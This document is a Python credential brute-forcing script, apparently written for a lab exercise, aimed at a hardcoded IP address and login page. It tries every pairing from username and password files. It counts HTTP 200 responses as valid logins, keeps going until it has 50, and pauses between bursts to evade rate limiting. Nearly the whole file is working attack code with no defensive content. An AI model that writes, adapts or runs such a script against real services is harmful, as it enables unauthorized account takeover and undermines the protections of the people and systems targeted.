from requests import Session
import time
import itertools

#lists containing every single username and password
username_list = []
password_list = []

#Rate Limit
#number of requests before being rate limited
NoR = 0
#length of pause before resuming requests
LoP = 0

#function to bruteforce credentials 
def bruteforce(): 
    credentials = []
    #stores the number of credentials found
    countCRED = 0
    #stores the number of requests sent
    countREQ = 0
    #used the itertools library to get all permutations of username and password
    for r in itertools.product(username_list, password_list):
        #r[0] is the username in username_list, r[1] is the password in password_list
        myData = {'username': r[0], 'password': r[1]}
        #when making several requests to the same host, the underlying TCP connection will be reused which result in performance increases
        session = Session()
        myURL = 'http://54.206.178.157:8084/classified.html'
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        myResponse = session.post(myURL, myData, headers)
        #we are interested in the status_code only because it tells us if the credentials were valid or not 
        status_code = myResponse.status_code
        if status_code == 200:
            #we want to store any valid credentials in a list so we can print at the end
            a = "Username: %s   Password: %s" % (r[0],r[1])  
            #everytime we find a valid credential, count is increased by 1
            countCRED += 1
            #adds to list
            credentials.append(a)
            #once we find 50, we can stop the loop and end the script 
            if countCRED == 50: 
                break
            #if we don't have 50, we keep going 
            else:
            #every time we make a request, adds 1 to the count 
                countREQ += 1
                #if request count triggers the request limit, pause for 10 seconds before continuing 
                if countREQ == NoR:
                    print("-------Rate Limit: Going to sleep--------")
                    time.sleep(LoP)
                    #resets the counter back to 0
                    countREQ = 0 
                    continue
                else:
                    continue
        #if invalid, prints out the invalid credentials
        elif status_code == 401: 
            print("Invalid Credentials! Username: {}   Password: {} ".format(r[0],r[1]))
            countREQ += 1
            if countREQ == NoR:
                print("-------Rate Limit: Going to sleep--------")
                time.sleep(LoP)
                countREQ = 0 
                continue
            else:
                continue
        #if returned status code is not 200 or 401, prints out the status code
        else:
            print ('Error code: %d' % (status_code))
    print('               ------------end-----------               ')
    #at the end, it prints out all the valid credentials 
    print(*credentials, sep='\n')


if __name__ == "__main__":
    #records the time the script is started 
    start_time = time.time()
    #asks user input for name of username and password file 
    usernme = str(input('Enter username file: '))
    passwd = str(input('Enter password file: '))
    try:
    #encoding in utf-8 prevents encoding issues that may arise from certain password lists 
        usernames = open(usernme, 'r', encoding='utf-8') 
        passwords = open(passwd, 'r', encoding='utf-8') 
    #if FileNotFoundError is invoked, it will quit the script
    except FileNotFoundError:
        print('File(s) cannot be found!') 
        quit()
    #if both files are found, it will make a list for the usernames and passwords 
    else: 
        for username in usernames:
            username_list.extend(map(str,username.rstrip().split(','))) 
        for password in passwords:
            password_list.extend(map(str,password.rstrip().split(',')))
    bruteforce()
    #records the current time after all functions are executed against the initial time recorded when the script was started
    print("--- %s seconds ---" % (time.time() - start_time))
